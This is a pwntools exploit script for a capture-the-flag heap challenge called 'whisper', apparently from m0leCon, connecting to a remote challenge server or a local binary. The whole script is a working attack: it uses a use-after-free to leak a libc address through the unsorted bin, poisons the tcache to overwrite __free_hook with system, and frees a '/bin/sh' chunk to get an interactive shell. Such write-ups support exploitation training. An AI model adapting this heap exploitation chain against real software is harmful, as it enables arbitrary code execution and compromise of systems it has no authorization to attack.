#!/usr/bin/env python3
from pwn import *

context.binary = elf  = ELF('./whisper',  checksec=False)
libc             = ELF('./libc.so.6',     checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13594)
    return process(
        ['./ld-linux-x86-64.so.2', '--library-path', '.', './whisper']
    )

p = conn()

# ------------------------------------------------------------------
# Primitives
# ------------------------------------------------------------------

# case 1: index → size (fgets) → data (read sz bytes)
def create(idx, size, data=b''):
    p.sendlineafter(b'> ',      b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'size: ',  str(size).encode())
    p.sendafter(b'data: ',      data[:size].ljust(size, b'\x00'))

# case 2: free(notes[idx].content) — no null — dangling pointer
def delete(idx):
    p.sendlineafter(b'> ',      b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

# case 3: read(notes[idx].size bytes) into notes[idx].content — UAF write
def edit(idx, data):
    p.sendlineafter(b'> ',      b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',      data)

# case 4: write(notes[idx].content, 0x10) — UAF read — returns 16 raw bytes
def show(idx):
    p.sendlineafter(b'> ',      b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    data = p.recv(0x10)
    p.recvline()                        # consume puts("") newline
    return u64(data[:8])                # fd pointer = libc address

# ------------------------------------------------------------------
# Phase 1 — Libc leak via unsorted bin
# ------------------------------------------------------------------

create(0, 0x500)                        # chunk L: size 0x510 > 0x410 → unsorted bin
create(1, 0x20)                         # guard: prevents L from coalescing with top

delete(0)                               # L → unsorted bin; L->fd = &main_arena.bins[0]

leak = show(0)                          # UAF read: fd = libc runtime address
log.info(f'leak:      {hex(leak)}')

libc.address = leak - libc.sym.__malloc_hook - 0x70
log.info(f'libc base: {hex(libc.address)}')

FREE_HOOK = libc.sym.__free_hook
SYSTEM    = libc.sym.system
log.info(f'free_hook: {hex(FREE_HOOK)}')
log.info(f'system:    {hex(SYSTEM)}')

# ------------------------------------------------------------------
# Phase 2 — Tcache poisoning → __free_hook = system
# ------------------------------------------------------------------

PSIZ = 0x60                             # poison chunk size class

create(2, PSIZ)                         # chunk A
create(3, PSIZ)                         # chunk B (will be HEAD)

delete(2)                               # tcache[0x70]: count=1, head=A
delete(3)                               # tcache[0x70]: count=2, head=B, B->fd=A

# UAF write through dangling notes[3] = B (HEAD): B->fd = &__free_hook
edit(3, p64(FREE_HOOK) + b'\x00' * (PSIZ - 8))

create(4, PSIZ)                         # pops B: count=1, head=FREE_HOOK
create(5, PSIZ, p64(SYSTEM))           # pops FREE_HOOK: __free_hook = system

# ------------------------------------------------------------------
# Phase 3 — Trigger shell
# ------------------------------------------------------------------

create(6, 0x20, b'/bin/sh\x00')        # note whose content is the shell string
delete(6)                               # free(ptr) → system(ptr) → system("/bin/sh")

p.interactive()